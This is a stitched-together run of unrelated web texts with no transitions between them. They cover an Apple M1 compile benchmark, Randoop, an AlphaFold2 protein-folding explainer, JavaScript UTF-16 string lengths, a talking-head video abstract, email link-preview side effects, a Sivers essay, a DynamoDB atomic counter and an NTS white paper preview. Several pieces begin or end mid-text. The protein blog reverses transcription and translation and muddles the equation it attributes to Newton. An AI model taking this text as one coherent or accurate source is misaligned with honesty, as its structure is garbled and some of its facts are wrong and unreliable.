  <code>libc++</code>'s <code>__version</code> header we can see that this
  version of Apple Clang has been branched off vanilla Clang somewhere in the
  10.0.0 development cycle.</p>

  <div>
  <p>You may have also noticed that the CPU name in the target triplet printed
  by Apple Clang does not match the more commonly used <code>aarch64</code>.
  In fact, if we run <code>config.guess</code> on this machine, we get:</p>

  <pre>$ ./config.guess
aarch64-apple-darwin20.1.0</pre>

  <p>To spare the users dealing with two names for the same thing,
  <code>build2</code> canonicalizes <code>arm64</code> to <code>aarch64</code>
  so in our <code>buildfiles</code> we will always see
  <code>aarch64</code>.</p>
  </div>

  <p>Another interesting thing to check is the number of hardware threads
  reported by <code>sysctl</code>, which is what our benchmark uses by
  default:</p>

  <pre>$ sysctl -n hw.ncpu
8</pre>

  <p>So we have 8 threads, with 4 of them corresponding to the performance
  cores and 4 – to the efficiency cores. Our first run will utilize all
  of them, which, unsurprisingly, turns out to produce the fastest time:</p>

  <pre>$ time sh ./build2-install-0.13.0.sh --local --yes ~/install
163s</pre>

  <p>It was a pleasant surprise that <code>build2</code> 0.13.0, which was
  released before M1 became available, builds and appears to be functioning
  without any issues. Since ARM has weak memory ordering, this also served as
  an additional validation of <code>build2</code>'s multi-threaded
  implementation and heavy use of atomics.</p>

  <p>As the first point of reference, let's compare it to my workstation with
  an 8-core Intel Xeon E-2288G (essentially i9-9900K plus ECC). It does the
  same build using vanilla Clang in 131s. While E-2288 is faster, M1's
  performance is nevertheless impressive. Especially when you consider that
  during the build the workstation is belching hot air and screaming like an
  airplane about to take off while M1 is whisper-quiet with barely warm air
  coming from its exhaust.</p>

  <p>Another pertinent benchmark result is a single-threaded run, which is
  indicative of how the CPU would perform in an incremental build:</p>

  <pre>$ time sh ./build2-install-0.13.0.sh --local --yes -j 1 ~/install
691s</pre>

  <p>For comparison, E-2288G gets the job done in 826s. So here the 5Ghz Xeon
  core is actually slower than the 3.2Ghz M1.</p>

  <p>Another interesting result is a 4-thread run which would only use the
  performance cores:</p>

  <pre>$ time sh ./build2-install-0.13.0.sh --local --yes -j 4 ~/install
207s</pre>

  <p>While somewhat slower than the all-core build, it also uses less memory.
  So a build that only utilizes performance cores might still make sense if
  you are short on RAM (which all current M1 machines are).</p>

  <p>Here is the summary of all the results we've seen so far:</p>

  <pre>CPU   CORES/THREADS  TIME
-------------------------
E-2288G    8/16      131s
M1         4+4       163s
M1         4         207s
M1         1         691s
E-2288G    1         826s</pre>

  <p>Nobody will argue that this compares apples to oranges on multiple
  dimensions (workstation vs mobile, several years old design/process vs the
  bleeding edge, etc). So let's add some interesting results from the Phoronix
  benchmark. The two classes of CPU that seem relevant to compare to are the
  latest workstation and mobile CPUs from Intel and AMD. Here is my pick (you
  can choose your own, just remember to add an extra 10% to the Phoronix
  results; also note that most of them use GCC instead of Clang):</p>

  <pre>CPU                    CORES/THREADS  TIME
------------------------------------------
AMD   Threadripper 3990X    64/128    56s
AMD   Ryzen        5950X    16/32     71s
Intel Xeon       E-2288G    8/16      131s
Apple                 M1    4+4       163s
AMD   Ryzen        4900HS   8/16      176s*
Apple                 M1    4         207s
AMD   Ryzen        4700U    8/8       222s
Intel Core         1185G    4/8       281s*
Intel Core         1165G    4/8       295s

* Extrapolated.</pre>

  <p>Note that the results for the best mobile Intel (1185G) and AMD (4900HS)
  are unfortunately not yet available and the numbers above are extrapolated
  based on frequency and other benchmark results.</p>

  <p>From the above table it's hard not to conclude that Apple M1 is an
  impressive CPU, especially when we also consider its power consumption.
  What's more, this is the first generally-available, desktop-class ARM CPU.
  For comparison, the same build on Raspberry Pi 4B takes 1724s, more than 10
  times longer! While we cannot boot Linux or Windows on M1, there are early
  indications that it should be possible to boot them in virtual machines with
  decent performance. As a result, ARM-based CI could become generally
  available and is something that we are currently looking into.</p>

  <p>After seeing the initial benchmarks of M1 one can't help but wonder how
  Apple pulled this off. While there is lot of speculation with some bordering
  on black magic and sorcery, I found this <a href="https://www.anandtech.com/show/16252/mac-mini-apple-m1-tested">Anandtech
  article on M1</a> and the one linked from it to be a good source of
  technical information. Here are the highlights:</p>

  <dl>
  <dt><b>TSMC 5nm process</b></dt>
  <dd>Compared to Intel's own 10nm (for 11x5G, 14nm for E-2288G) and AMD/TSMC
  7nm.</dd>

  <dt><b>LPDDR4-4266 RAM</b></dt>
  <dd>Only latest mobile CPUs from Intel and AMD can achieve the same
  speed.</dd>

  <dt><b>Large L1 cache</b></dt>
  <dd>M1 has an unusually large L1 instruction and data caches.</dd>

  <dt><b>Large and fast shared L2 cache</b></dt>
  <dd>Unlike Intel and AMD CPUs which use smaller private L2 caches and a
  large but slower shared L3 cache, M1 uses a fast and large shared L2
  cache.</dd>

  <dt><b>Wide core</b></dt>
  <dd>M1 core is unusually "wide" meaning that it can perform multiple
  instructions in parallel and/or out of order. There is speculation that
  because ARM has weak memory ordering and fixed-size instruction encoding,
  Apple was able to make a much wider core than usual before hitting the
  diminishing returns issue.</dd>
  </dl>

  <p>It would also be interesting to see how/if Apple will be able to scale
  this design to more cores.</p>

<h2>
What is Randoop?</h2>

<p>Randoop is a unit test generator for Java. It automatically creates unit tests for your classes, in JUnit format.</p>

<p>The <a href="https://randoop.github.io/randoop/manual/index.html">Randoop manual</a> tells you how to
<a href="https://randoop.github.io/randoop/manual/index.html#getting_randoop">install</a> and
<a href="https://randoop.github.io/randoop/manual/index.html#running_randoop">run</a> Randoop.
</p>

<h2>
How does Randoop work?</h2>

<p>
Randoop generates unit tests using feedback-directed random test generation.
This technique pseudo-randomly, but smartly, generates sequences of
method/constructor invocations for the classes under test.
Randoop executes the sequences it creates, using the results of the
execution to create assertions that capture the behavior of your program.
Randoop creates tests from the code sequences and assertions.
</p>

<p>
Randoop can be used for two purposes:  to find bugs in your program, and to
create regression tests to warn you if you change your program's behavior
in the future.
</p>

<p>
Randoop's combination of test generation and test execution
results in a highly effective test generation technique.
Randoop has revealed previously-unknown errors even in widely-used
libraries including Sun's and IBM's JDKs and a core .NET component.
Randoop continues to be used in industry, for example at ABB corporation.

      <small>29 November 2020</small>


<p>by Abhirath Batra</p>

<h2 id="tldr">TLDR</h2>

<p>Just yesterday, Deepmind published a <a href="https://deepmind.com/blog/article/alphafold-a-solution-to-a-50-year-old-grand-challenge-in-biology">blog</a> talking about how their AI, AlphaFold2, predicted protein structures in the biennial CASP challenge this year with stunning accuracy. There’s been a lot of buzz in the computational science community discussing the ramifications of their work.</p>

<p>If you’ve seen the buzz and are curious about protein folding, read on…
This post is supposed to capture the motivation and complexity of the problem for an audience familiar with STEM in some way.</p>

<p>Majorly, this is a post close to my heart since protein folding is the broad problem in which I did my Masters’ research. It is the first topic of research I worked in and therefore love talking about!</p>

<hr>

<h2 id="quick-introduction">Quick introduction</h2>

<p>Proteins are fundamental to life, as they quite literally <a href="https://www.youtube.com/watch?v=X_tYrnv_o6A">DO things in the body</a>. They transport molecules, help decode the DNA, and digest the food. Infact, they sit at the functional end of the <a href="https://en.wikipedia.org/wiki/Central_dogma_of_molecular_biology">central dogma of biology</a>(i.e. DNA-&gt; RNA -&gt; Protein ; DNA is translated into RNA which is transcribed into proteins)
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ee/Cdmb.svg/1280px-Cdmb.svg.png" alt="Central Dogma of Biology"></p>

<h2 id="the-fuss-about-structures">The fuss about structures</h2>
<p>If you remember high school, they fold into intricate (quaternary) structures that are highly important to their funciton. Structure matters since a lot of what proteins do as mid-sized molecules depend on them mechanically <strong>docking</strong> with other molecules(throwback to coordinate chemistry!). They exist at a size regime that is a fascinating grey area of where mechanical and chemical effects both matter!
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/97/Docking_representation_2.png/1280px-Docking_representation_2.png">
Common drugs use this fact. For example, they will try to bind competitively with the target of a protein hence preventing its action (that’s how your coffee works!) or attach to a protein at a different site and alter its structure, rendering it useless.</p>

<h2 id="the-fault-in-our-structures">The fault in our structures</h2>
<p>Now proteins are manufactures in ribosomes, at immense speed, with immense precision. But chemical machinery is not without folly. So sometimes it makes mistakes. The sequence stays the same, but like a bead of strings that can be arranged in anyway, it can be misfolded. Misfolded proteins, as you can guess, malfunction! For diseases like Alzhiemer’s, the misfolding of one protein and its aggregation in the brain is one of the primary candidates of being the root cause.</p>

<p>This just means, that studying the 3-D structure of proteins is of high importance. It is also important to study the path taken by proteins to fold that way.</p>

<h2 id="methods-of-measurement">Methods of measurement</h2>
<p>To see particles that small, NMR and XRAY-crystallography are usually used. Both these methods fall short in:</p>
<ol>
  <li>Being able to capture the entire dynamics of a protein. i.e., WATCH the folding process happen; since the timescales are too short.</li>
  <li>Giving a model that can help predict the 3-d structure of a protein given its sequence</li>
  <li>Providing insights into other “meta-stable” conformations which the protein may assume owing to random forces.</li>
</ol>

<p><strong>NB : NMR is able to capture proteins dynamics technically. I’m not too familiar with the shortcomings of solution state NMR. If you have questions though, I’d be happy to point you to my friends in TIFR Hyderabad’s National NMR facility who can help answer questions.</strong></p>

<p>These measurements are important because they can help us understand WHY a protein misfolded, and also, how a mutated protein could look folded and thus behave!</p>

<h2 id="enter-computers">Enter, Computers!</h2>

<p>Since experimental methods don’t answer these questions, we turn to computational methods. What is done is actually incredibly fascinating!</p>

<p>We model all the atoms as known in a protein as tiny spherical masses, and model the forces between them including electrochemical bonds, nuclear repulsion and weak forces like van der waal forces. Then, we essentially solve newton’s second equation of motion(YEP, the one from 9th grade : \(s_t = u_t + 0.5 * a* t^2\) ) albeit with a different algebraic formulation, for each of the atoms to predict their trajectory in time</p>

<p>Now, if you were using this equation to study a ball thrown into the air and predict it’s entire trajectory, you would want to solve this equation for millisecond intervals, to “see” the ball fly up and then come back down in frames. If you were to take a second interval, the snapshots you would predict would be too far apart.</p>

<p>Similarly for the atoms, since you want to capture the smallest relevant motion, you solve for 2-femto-second intervals, that is the timescale at which molecular bonds move owing to the energy from room temperature heat. This may all seem well and good but it is not!
 IF you were to use a perfect model so that it predicts the real thing, you’d still be modelling a molecule in pure vaccum. However, in the body, all of this exists in a water medium. And in water, properties change because of water’s dipole and kinetic interactions with the system. 
<img src="https://ars.els-cdn.com/content/image/1-s2.0-S1471489210001463-gr1.jpg"></p>

<p>So, you guessed it, the model is made to contain 10s of thousands of water molecules, arranged in a repeating cube, so that the (ideally) modelled system mimics what the molecule will feel inside a living system.</p>

<p>Now, here we have 100s of thousands of particles, with pairwise forces defined for them, that too not just of one kind. From those, we predict their position 2 femto seconds later. Cool. But for how many steps do we have to see this? Well, events of interest such as folding happen at timescales of microseconds to miliseconds. That means, you’d have to do 10^10 iterations of this system to see meaningful events happening.</p>

<h2 id="the-curse-of-dimensionality">The curse of dimensionality</h2>

<p>This method of modelling and simulating trajectories is called <a href="https://en.wikipedia.org/wiki/Molecular_dynamics#:~:text=Molecular%20dynamics%20(MD)%20is%20a,%22evolution%22%20of%20the%20system.">Molecular Dymanics</a></p>

<p>It would be obvious by now that the amount of computational horsepower these simulations takes is so huge that reserachers rely on highly distributed computing to get any useful information. Many labs use accesses to super computers while companies like D.E.Shaw reserach built a special hardware called <a href="https://en.wikipedia.org/wiki/Anton_(computer)">Anton</a> right in the heart of Manhattan to simulate their molecules.</p>

<p>Vijay Pande’s(A16Z) lab from Stanford took the crowdfunding approach with the <a href="https://foldingathome.org/"> Folding at Home </a> Project to allow users to lend their extra computational capacity to contribute to folding proteins from home.</p>

<h2 id="theoretical-work-arounds">Theoretical work-arounds</h2>

<p>Yet other fields exist where in this problem is formalised in a way to reduce computational requirements. The problem of seeing rare events like folding can be formalised through statistical mechanics to be a problem of sampling from a high dimensional probability distribution where we don’t know the entire distribution, but we have a generator which can generate a new random(almost) draw. The simulation generates these states. There are ways that you can use to make this generator generate rarer samples, by let’s say turning up the heat in the system to make the molecules vibrate faster.</p>

<p>Another major way people approach this problem is to think of it in terms of dimensionality reduction, in that a lot of the internal motion of the molecule is actually irrelevant and the true dynamics of the system happen in lower dimensions that capture true transitions. These lower dimensions can be chemical at times, like the dihedral angles on the peptide bonds of 2 amino acids.</p>

<p>Back in IIIT, the approach I worked on with my advisor Dr. Prabhakar Bhimalapuram was trying to use multiple “replicas” of the same system, with a repulsive force between them to make them sample divergent areas of the probability landscape. Here’s a <a href="http://web2py.iiit.ac.in/research_centres/publications/view_publication/mastersthesis/680">link</a> if you’re interested in reading more.</p>

<h2 id="now-comes-in-ai">Now comes In AI.</h2>
<p>AI could help solve the issue in many ways :</p>
<ol>
  <li>Help identify lower dimensions in which to simulate and understand the system</li>
  <li>Predict rare events given a simulated system</li>
  <li>Directly predict folded states</li>
</ol>

<p>The third method is what Deepmind’s AlphaFold2 has done. It is a complex model that treats the molecular structure as a spatial graph and is then trained using ~170,000 protein structures available publicly. Using that they predicted structures in the CASP14 challenge with incredible and astonishing accuracy. Their own blog contains details of all the incredible results they have and links to their previous paper.</p>

<h2 id="perspective">Perspective</h2>

<p>Deepmind has been able to achieve via computational magic, something that we watch nature do in the blink of an eye. Of course, that’s a trite and an unverifiable take on the universe’s functioning. 
However, the real ramifications are huge. If it is true that we know the first principles that govern the universe, and have such methods as shortcuts to make predictions about what nature would have made given those first principles, we have a complete toolkit! With these 2 you can study molecules with remarkable detail. 
It not only opens avenues in understanding nuances of what is already there, but also give a huge boost to synthetic biology.</p>

<p>We would be able to predict the structures of faulty proteins based on  mutations from the genes encoding them. On that, free energy calculations(from the MD regime) could lend us enormous power to predict their behavior in organisms and predict drug targets.</p>

<p>We can enter the regime of large-molecule therapeutics. With this tool, we would be able to design synthetic proteins, predict how they fold, and use them as candidates for all sorts of drugs in the body!</p>

<p>As usual, our ability to predict the future is severely limited!</p>

<pre><code>const <span>name</span> = ‘Nick’

console.log(<span>name</span>.length) // <span>4</span>
</code></pre><p>Variable <code>name</code> has 4 characters ‘N’, ‘i’, ‘c’, ‘k’ and length is also 4.</p>
<p>Everything seems logical.</p>
<p>Let’s go further and add emoji to my name.</p>
<pre><code>const <span>name</span> = ‘Nick 🐃’

console.log(<span>name</span>.length) // <span>7</span>
</code></pre><p>Hmm, strange.</p>
<p>Variable <code>name</code> must have 6 characters ‘N’, ‘i’, ‘c’, ‘k’, ‘ ‘ (whitespace) and ‘🐃’</p>
<p>But have 7.</p>
<p>It seems like the bull has 2 characters.</p>
<pre><code><span>const</span> emoji = ‘🐃’

console.<span>log</span>(emoji.length) 
</code></pre><p>Interesting 🤔</p>
<p>Let’s figure out why.</p>
<p>We go to <a target="_blank" href="https://tc39.es/ecma262">the official documentation</a> of ECMAScript (<a target="_blank" href="https://en.wikipedia.org/wiki/ECMAScript">it’s a programming language on which JavaScript is based</a>).</p>
<p>Scroll to <a target="_blank" href="https://tc39.es/ecma262/#sec-ecmascript-language-types-string-type">“6.1.4 The String Type</a>.”</p>
<p>And find this:</p>
<blockquote>
<p><em>“The String type is the set of all ordered sequences of zero or more 16-bit unsigned integer values (“elements”) up to a maximum length of 2⁵³ - 1 elements. The String type is generally used to represent textual data in a running ECMAScript program, in which case each element in the <strong>String is treated as a UTF-16 code unit value</strong>.”</em></p>
</blockquote>
<p>So string in JavaScript is a sequence of UTF-16 code unit values.</p>
<blockquote>
<p><em>❓What is UTF-16?</em></p>
<p><em>💬 A Unicode transformation format (UTF) is an algorithmic mapping from every Unicode code point to a unique byte sequence.</em></p>
</blockquote>
<p>One UTF-16 code unit value is a number from 0x0000 to 0xFFFF.</p>
<blockquote>
<p><em>❓What is 0x0000 and 0xFFFF?</em></p>
<p><em>💬  <strong>0x</strong> represent <a target="_blank" href="https://simple.wikipedia.org/wiki/Hexadecimal">the hexadecimal numeral system</a>, often shortened to "hex", is a numeral system made up of 16 symbols (base 16). The standard numeral system is called decimal (base 10) and uses ten symbols: 0,1,2,3,4,5,6,7,8,9. Hexadecimal uses the decimal numbers and six extra symbols.</em></p>
</blockquote>
<p>If we convert my name Nick to UTF-16 (like JavaScript see it) we will get 0x004e 0x0069 0x0063 0x006b.</p>
<p>0x004e = N</p>
<p>0x0069 = i</p>
<p>0x0063 = c</p>
<p>0x006b = k</p>
<p>But how does JavaScript treat emojis?</p>
<p>In UTF-16, Unicode characters from the <a target="_blank" href="https://en.wikipedia.org/wiki/Plane_%28Unicode%29">Basic Multilingual Plane</a> (contains characters for almost all modern languages) are encoded with one code unit. </p>
<p>Other characters from the non-Basic Multilingual Plane (emojis, musical notations, cards, hieroglyphs, etc) require two code units.</p>
<p>So UTF-16 format represents 🐃 emoji with two code units (0Xd83d 0Xdc03).</p>
<p>That’s why <code>‘🐃’.length</code> gives 2.</p>
<p>To consolidate everything we have learned, let’s play a little with Unicode and JavaScript.</p>
<pre><code><span>const</span> name = ‘Nick’

<span>const</span> nameInUnicode = ‘\u<span>004</span>e\u<span>0069</span>\u<span>0063</span>\u<span>006</span>b’

<span>console</span>.log(name === nameInUnicode) // true

<span>console</span>.log(nameInUnicode.length) // <span>4</span>

<span>const</span> fullName = ‘Nick 🐃’

<span>const</span> fullNameInUnicode = ‘\u<span>004</span>e\u<span>0069</span>\u<span>0063</span>\u<span>006</span>b\u<span>0020</span>\ud<span>83</span>d\udc<span>03</span>’

<span>console</span>.log(fullName === fullNameInUnicode) // true

<span>console</span>.log(fullNameInUnicode.length) // <span>7</span>
</code></pre><blockquote>
<p><em>❓ What is \u?</em></p>
<p><em>💬 A Unicode character escape sequence represents the single Unicode code point formed by the hexadecimal number following the “\u” or “\U” characters.</em></p>
</blockquote>
<h2 id="in-the-end">In the end</h2>
<p>Knowing that string in JavaScript is a sequence of UTF-16 code unit values can save you from unpredictable bugs when you work with different characters not from BMP, like emojis.</p>

<h2>Abstract</h2>
<p>We propose a neural talking-head video synthesis model and demonstrate its application to video conferencing. Our model learns to synthesize a talking-head video using a source image containing the target person's appearance and a driving video that dictates the motion in the output. Our motion is encoded based on a novel keypoint representation, where the identity-specific and motion-related information is decomposed unsupervisedly. Extensive experimental validation shows that our model outperforms competing methods on benchmark datasets. Moreover, our compact keypoint representation enables a video conferencing system that achieves the same visual quality as the commercial H.264 standard while only using one-tenth of the bandwidth. Besides, we show our keypoint representation allows the user to rotate the head during synthesis, which is useful for simulating a face-to-face video conferencing experience.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      
        <p>Link preview provided as a feature by webmail/clients such as Outlook or IM like Telegram may cause unexpected behavior like unwanted account register confirming, automatic mailing list subscribing or even infinite password resetting through links with special functionality.</p>
<h2 id="Official-Account-Used-For-Registering"><a href="#Official-Account-Used-For-Registering" title="Official Account Used For Registering"></a>Official Account Used For Registering</h2><p>One morning, I opened OUR mailbox, and found an address validation letter with a confirming link lying there. Spam, I thought, as this email address is used as a official account, no one in our organizaiton would use it for personal account registration, but right before I close this mailbox, I was suddenly reminded of something.</p>
<p>The day before this morning, we happily tested a new functionality provided by the webmail of Outlook – Link Preview. Well since we are already modern now, with modern front-end and modern webpage, what’s wrong with link preview? This is what we all expected! This is how modern front-end should be like!</p>
<p>But wait, would link preview visit every link in this email? If it does, right after I opened this email, the validation would be done!</p>
<p>Even worse, I cannot check whether the validation is over since the registered account is not in my hand and I dare not click on that confirming link.</p>
<p>After some discussion within our org, we think that there may be some allow lists that prevent the preview of certain sites, but if the list is not a list of REGEX, when I register the account of popular platforms, the link would still be previewed.</p>
<p>So the registered account still hangs there, we do not know its status, and bad thing can be done with that account.</p>
<h2 id="Other-Stories"><a href="#Other-Stories" title="Other Stories"></a>Other Stories</h2><p>After I discovered this issue, I come to a broader concern on similar issues. And after posting this issue among my friends, more stories are collected and more exploits can be done.</p>
<p>One story is that one user of Telegram <em>gmailbot</em> received a validation letter one day, and after they opened that bot, the message of confirmation success was received right away. The mechanism of preview of Telegram is to preview every first link of one message unless the user cancels that.</p>
<p>Another story is that one user of one email provider used that email for some account registering, and one day they forgot their password. For that site, password reset are done by a special link sent to the email address associated with that account, but for the sake of security, the email provider checks every link in the email(common behavior of big providers, maybe), hence the password reset link would have been accessed once when the user sees the email, and the reset cannot be done successfully. Since this security check is a black box and unrevealed to that user, the user tried almost infinitely and asked the admin of that site to debug.</p>
<ol>
<li>When subscribing a mailing list on web, a confirmation letter would be sent, in some forms it asks you to reply to that email containing certain string, but mostly it shows you a validation link. This may be used for spamming hence DoS of one account; it can also be used for DoS of one mailing list as all subscribers are ‘valid’.</li>
<li>When you upload a PGP public key to a keyserver like OpenPGP, it sends validation letter. Hence fake public key of one identity can be made with confirmation, and without revocation.</li>
<li>As the last story above indicates, password reset can never be done, or done by the provider.</li>
<li>When there are one-time special functional links(common behavior), and the provider/client automatically access that link in any form, there are unexpected behaviors. </li>
</ol>
<p>Ref to this post <a target="_blank" rel="noopener" href="https://www.macrumors.com/2020/10/26/link-previews-may-lead-to-security-vulnerabilities/">https://www.macrumors.com/2020/10/26/link-previews-may-lead-to-security-vulnerabilities/</a></p>
<p>It talks about information leaking and malicious payload, while I am from the perspective of the protocol itself.</p>
<p>Providers, don’t touch my thing.</p>
<p>Automation/Rules without turn-off options are bad. </p>

<div><p>from the book “<a href="https://sive.rs/a" rel="tag">Anything You Want</a>”:</p></div>

<small>2008-10-23</small>
</header>

<p>
	I used to take voice lessons from a great teacher named <a href="http://www.warrensenders.com/">Warren Senders</a>.
</p><p>
	For each lesson, I’d bring in one song I was trying to improve.
</p><p>
	First, I’d sing it for him as written.
</p><p>
	Then he’d say, “OK — <strong>now do it up an octave</strong>.”
</p><p>
	“Uh... up an octave? But I can’t sing that high!”
</p><p>
	“I don’t care! Do it anyway! Go! 1.. 2.. 3.. 4..”
</p><p>
	I’d sing the whole song again, in screeching squeaking falsetto, sounding like a choking mouse.
	But by the second half of the song, it was almost charming.
</p><p>
	Then he’d say, “OK — <strong>now do it down an octave</strong>.”
</p><p>
	“Down an octave?  But I don’t think I can!”
</p><p>
	“Doesn’t matter! Go! 1.. 2.. 3.. 4..”
</p><p>
	I sounded like a garbage disposal or lawn mower, but he made me sing the whole song that way.
</p><p>
	Then he’d make me sing it twice as fast.
	Then twice as slow.
	Then like Bob Dylan.
	Then like Tom Waits.
	Then he’d tell me to sing it like it’s 4 a.m. and a friend woke me up.
	Then he’d give me many other scenarios.
</p><p>
	After all of this, he’d say, “Now… how did that song go again?”
</p><p>
	It was the clearest proof that what I thought was “the” way the song went was really just one of an infinite number of options.
</p>
<hr>
<p>
	I’m taking an entrepreneurship class now.
	I’ve never studied business before.
</p><p>
	We analyzed a business plan for a mail-order pantyhose company.
	Like all business plans, it proposed only one plan.
</p><p>
	After reading the whole thing, I felt like saying things my old voice teacher would have said:
</p><ul>
<li>
	“OK — <strong>make a plan that only requires $1000.</strong> Go!”
</li><li>
	“Now <strong>make a plan for 10-times as many customers</strong>. Go!”
</li><li>
	“Now <strong>do it without a website</strong>. Go!”
</li><li>
	“Now <strong>make all your initial assumptions wrong, and have it work anyway</strong>. Go!”
</li><li>
	“Now <strong>show how you would franchise it</strong>. Go!”
</li></ul>
<p>
	You can’t pretend there’s only one way to do it.
	Your first idea is just one of many options.
	No business goes as planned, so make ten radically different plans.
</p><p>
	Realizing <strong>the initial choice you made was just one of many</strong> brings all kinds of weathered wisdom and insight into your business.
</p>
<hr>
<p>
	Same thing with your current path in life:
</p>
<ul><li>
	Now you’re living in New York City, obsessed with success. Go!
</li><li>
	Now you’re a free spirit, backpacking around Thailand. Go!
</li><li>
	Now you’re a confident extrovert and everyone loves you. Go!
</li><li>
	Now you’re married and your kids are your life. Go!
</li><li>
	Now you spend a few years in relative seclusion, reading and walking. Go!
</li></ul>

<![CDATA[Building a Simple Atomic Counter with DynamoDB and API Gateway]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1605889737391/MgHemT-bu.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>A web application often needs a central counter. We have several simple use-cases like the member id for a registration application. Or the amount collected on a sales application - there are many that we all have seen. We have to make sure the concurrent updates do not clash, and the no data is lost in the process. This problem increases further when our application scales larger on the cloud - with millions of concurrent users.</p>
<p>It is best to avoid such a use case - in large scale applications. It is always advisable that we use a design that does not need an atomic counter - for example using UUID instead of an increasing number. But there are times where we just need the counter. When I found myself in such a situation, here is a solution that I used. It is based on API Gateway - Dynamo DB integration. It has a very good response time and minimal cost.</p>

<p>We all know what is DynamoDB. For those who don't, it is the wonderful serverless NoSQL database provided by AWS. It scales seamlessly to huge volumes and throughput - maintaining extremely fast operations with latency in single digit milliseconds. It is the ideal database for anyone - startup, or enterprise. DynamoDB ensures eventual consistency for all updates. But there is a way to get atomic updates as well.</p>
<p>Going by the One App - One Table philosophy, create a new Item in the table. You can choose the "primaryKey" field as per your data design.</p>
<pre><code>{
   <span>primaryKey</span>: <span>"atomicCounter"</span>,
   <span>counterValue</span>: <span>0</span>
}
</code></pre>
<p>So we have a counter that starts with 0. Now, we to configure it to increment atomically and return the number. DynamoDB API provides a method to do it. In order to invoke it, we have to configure the API Gateway</p>

<p>The API Gateway is a versatile service to configure and export API's to the external world. We can use it to invoke Lambda functions, or directly invoke specific AWS Services. We will use the latter to invoke DynamoDB directly.</p>
<p>So we go to the <a target="_blank" href="https://blog.thewiz.net/!https://ap-south-1.console.aws.amazon.com/apigateway/">API Gateway Console</a>, to create a new Rest API - or just a new Resource/Method in your existing application API. Create a new API, and resource and then add a GET method into it. We can use a POST as well. But, GET is more elegant since we only get the counter without providing anything.</p>
<p>Next, we configure the API integration to invoke the DynamoDB.</p>
<h2 id="request-integration">Request Integration</h2>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605884426659/6UiP0SiQ2.jpeg?auto=format&amp;q=60" alt="Request Integration.jpg"></p>
<p>Next we provide an integration mapping for the request. We do it here - at the bottom of the Request Integration page.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605880023900/7-otb2WgI.jpeg?auto=format&amp;q=60" alt="Request Mapping.jpg"></p>
<pre><code>UpdateItem
{
    <span>"TableName"</span>: <span>"donation-data"</span>,
    <span>"Key"</span>: {
        <span>"context"</span>: {
            <span>"S"</span>: <span>"atomicCounter"</span>
        },
        <span>"id"</span>: {
            <span>"S"</span>: <span>"id"</span>
        }
    },
    <span>"UpdateExpression"</span>: <span>"set counterValue = counterValue + :num"</span>,
    <span>"ExpressionAttributeValues"</span>: {
        <span>":num"</span>: {<span>"N"</span>: <span>"1"</span>}
    },
    <span>"ReturnValues"</span> : <span>"UPDATED_OLD"</span>
}
</code></pre><h2 id="response-integration">Response Integration</h2>
<p>Similarly, we have to map the output on the response. Click on the Response Integration link and add this mapping in there</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605883483314/cStHWxsx7.jpeg?auto=format&amp;q=60" alt="Response Integration"></p>
<pre><code>


$value.substring(<span>1</span>,$l)
</code></pre>
<p>We are done with configuring the API. Now click on Deploy API, select a stage and it is ready to test.</p>
<p>Invoke the API from Postman. Everytime you invoke it, you will see the number increasing. </p>
<p>The update operation we used is atomic, so we will always have a unique number from the API.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>This white paper gives an overview of NTS and a detailed description of the authentication process that ensures you receive time information from a trusted source. This includes the step-by-step details of the key establishment and time stamping process. We also provide a summary of the elements that enable NTS to scale and to secure NTP against a range of attack vectors.</p><div><h2>This is a preview of Netnod's NTS white paper. To read&nbsp;the full white paper, see link below.
</h2><p>Introduction
</p><p>Many of the important security tools that keep us safe online depend on accurate time. But until recently there was no way to ensure that the time you received over the Internet was correct. There was simply no way to tell if you were being fed time from a malicious or trusted source.</p>
<p>This is largely because the current standard for receiving time over the Internet, the Network Time Protocol (NTP), was created in 1985. In those more innocent times, the need to secure NTP, the type of security needed, and how to provide it were less understood.</p>
<p>Over the last 35 years, a range of security flaws and some high-profile attacks have shown that NTP needed significantly improved security. The new Network Time Security (NTS) standard has been designed to fix that.</p>
<p><span><strong>NTP security issues&nbsp;</strong></span></p>
<p>Unsecured NTP is vulnerable to Man-in-the-Middle (MITM) attacks where a malicious actor sits between you and the NTP server, listens in on the conversation, forges&nbsp; messages and lies to you about time. As a lot of processes are dependent on accurate time, the consequences here can be very serious and can include:</p>
<ul><li>Incorrect timestamps on logs and transactions which can support fraudulent activities or help disguise other criminal action&nbsp;</li>
<li>Authentication problems, attacks and issues with authentication security measures&nbsp;</li>
<li>Issues with cryptographic signatures and establishing encrypted sessions such as Transport Layer Security (TLS)&nbsp;</li>
<li>DNS Security (DNSSEC) failing to work if the client doesn’t have accurate time</li>
</ul><p><span><strong>Previous attempts at NTP security&nbsp;</strong></span></p>
<p>There have been some previous attempts to add security to NTP. Commonly referred to as NTP-AUTH, these attempts did not provide all necessary aspects of security (confidentiality, authentication and integrity including protection against replay attacks).&nbsp;</p>
<p>Moreover, the underlying security mechanism for NTP-AUTH (MD5 or SHA-1) could be considered weak at best. NTP-AUTH is based on secret keys but the key agreement is not standardized. This means that any NTP service provider wanting to use NTP-AUTH has to find their own way to exchange keys with the client out-of-band.&nbsp;</p>
<p>This often requires a potential client to send a letter or fax to get the secret key. The need for a server to store uniquesecret keys for all clients creates scalability problems: as the number of users grows, the storage requirements and especially the ability to rapidly look up a given key makes the service hard to scale.</p>
<p>Given all these issues, it has long been apparent that a new security mechanism for NTP is needed; one based on modern security mechanisms that could also allow the service to scale to potentially millions of clients.</p>
<h2><strong>The NTS standard</strong></h2>
<p>NTS has been developed within the Internet Engineering Task Force (IETF). In March 2015, the first Internet-Draft of the NTS standard was published. Over the next five years, the draft went through 28 further iterations until the Internet Draft ‘Network Time Security for the Network Time Protocol’ was published as a Proposed Standard (RFC8915) in September 2020.&nbsp;</p>
